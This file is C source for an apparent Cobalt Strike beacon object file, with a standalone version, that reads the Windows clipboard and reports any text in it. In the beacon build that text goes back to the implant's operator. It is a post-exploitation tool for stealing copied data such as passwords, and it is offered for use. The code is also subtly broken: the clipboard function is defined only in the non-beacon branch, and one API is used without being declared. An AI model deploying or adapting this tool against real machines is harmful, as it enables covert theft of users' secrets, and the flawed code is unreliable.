#include <windows.h>
#include "bofdefs.h"
#include "base.c"

#ifdef BOF
DECLSPEC_IMPORT BOOL USER32$OpenClipboard(HWND hWndNewOwner);
DECLSPEC_IMPORT BOOL USER32$CloseClipboard(VOID);
DECLSPEC_IMPORT HANDLE USER32$GetClipboardData(UINT uFormat);
DECLSPEC_IMPORT BOOL USER32$IsClipboardFormatAvailable(UINT format);
DECLSPEC_IMPORT HGLOBAL KERNEL32$GlobalLock(HGLOBAL hMem);
DECLSPEC_IMPORT BOOL KERNEL32$GlobalUnlock(HGLOBAL hMem);
#endif

void GetClipboardContents();

#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
	if(!bofstart())
	{
		return;
	}
	GetClipboardContents();
	printoutput(TRUE);
};

#else

int main()
{
	GetClipboardContents();
	return 0;
}

void GetClipboardContents()
{
#ifdef BOF
	if (!USER32$OpenClipboard(NULL))
	{
		BeaconPrintf(CALLBACK_ERROR, "Failed to open clipboard. Error: %lu", KERNEL32$GetLastError());
		return;
	}

	// Check for text format
	if (USER32$IsClipboardFormatAvailable(CF_TEXT))
	{
		HANDLE hData = USER32$GetClipboardData(CF_TEXT);
		if (hData != NULL)
		{
			char* pszText = (char*)KERNEL32$GlobalLock(hData);
			if (pszText != NULL)
			{
				internal_printf("Clipboard Text Content:\n%s\n", pszText);
				KERNEL32$GlobalUnlock(hData);
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to lock clipboard data");
			}
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to get clipboard data");
		}
	}
	// Check for Unicode text format
	else if (USER32$IsClipboardFormatAvailable(CF_UNICODETEXT))
	{
		HANDLE hData = USER32$GetClipboardData(CF_UNICODETEXT);
		if (hData != NULL)
		{
			WCHAR* pszText = (WCHAR*)KERNEL32$GlobalLock(hData);
			if (pszText != NULL)
			{
				internal_printf("Clipboard Unicode Text Content:\n%S\n", pszText);
				KERNEL32$GlobalUnlock(hData);
			}
			else
			{
				BeaconPrintf(CALLBACK_ERROR, "Failed to lock clipboard data");
			}
		}
		else
		{
			BeaconPrintf(CALLBACK_ERROR, "Failed to get clipboard data");
		}
	}
	else
	{
		internal_printf("No text content available in clipboard\n");
	}

	USER32$CloseClipboard();
#else
	// Standalone executable version using normal Windows API
	if (!OpenClipboard(NULL))
	{
		printf("Failed to open clipboard. Error: %lu\n", GetLastError());
		return;
	}

	// Check for text format
	if (IsClipboardFormatAvailable(CF_TEXT))
	{
		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData != NULL)
		{
			char* pszText = (char*)GlobalLock(hData);
			if (pszText != NULL)
			{
				printf("Clipboard Text Content:\n%s\n", pszText);
				GlobalUnlock(hData);
			}
			else
			{
				printf("Failed to lock clipboard data\n");
			}
		}
		else
		{
			printf("Failed to get clipboard data\n");
		}
	}
	// Check for Unicode text format
	else if (IsClipboardFormatAvailable(CF_UNICODETEXT))
	{
		HANDLE hData = GetClipboardData(CF_UNICODETEXT);
		if (hData != NULL)
		{
			WCHAR* pszText = (WCHAR*)GlobalLock(hData);
			if (pszText != NULL)
			{
				wprintf(L"Clipboard Unicode Text Content:\n%s\n", pszText);
				GlobalUnlock(hData);
			}
			else
			{
				printf("Failed to lock clipboard data\n");
			}
		}
		else
		{
			printf("Failed to get clipboard data\n");
		}
	}
	else
	{
		printf("No text content available in clipboard\n");
	}

	CloseClipboard();
#endif
}

#endif
